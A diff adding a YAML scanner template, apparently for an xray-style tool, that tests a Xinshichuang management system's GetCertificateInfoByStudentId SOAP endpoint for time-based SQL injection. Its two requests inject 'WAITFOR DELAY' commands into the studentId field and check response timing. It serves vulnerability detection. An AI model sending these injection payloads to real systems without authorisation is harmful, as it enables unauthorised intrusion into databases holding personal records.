@@ -1,0 +1,46 @@
+name: poc-yaml-xinshichuang-GetCertificateInfoByStudentId-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx
+      headers:
+        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
+        Content-Type: text/xml; charset=utf-8
+      body: "\
+        <?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\
+        <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\
+          <soap:Body>\r\n\
+            <GetCertificateInfoByStudentId xmlns=\"http://tempuri.org/\">\r\n\
+              <studentId>1;WAITFOR DELAY '0:0:3'--</studentId>\r\n\
+            </GetCertificateInfoByStudentId>\r\n\
+          </soap:Body>\r\n\
+        </soap:Envelope>\r\n\
+        "
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: POST
+      path: /OfficeManagement/RegisterManager/Report/Training/Report/GetprintData.asmx
+      headers:
+        SOAPAction: "http://tempuri.org/GetCertificateInfoByStudentId"
+        Content-Type: text/xml; charset=utf-8
+      body: "\
+        <?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n\
+        <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\
+          <soap:Body>\r\n\
+            <GetCertificateInfoByStudentId xmlns=\"http://tempuri.org/\">\r\n\
+              <studentId>1;WAITFOR DELAY '0:0:6'--</studentId>\r\n\
+            </GetCertificateInfoByStudentId>\r\n\
+          </soap:Body>\r\n\
+        </soap:Envelope>\r\n\
+        "
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139723251
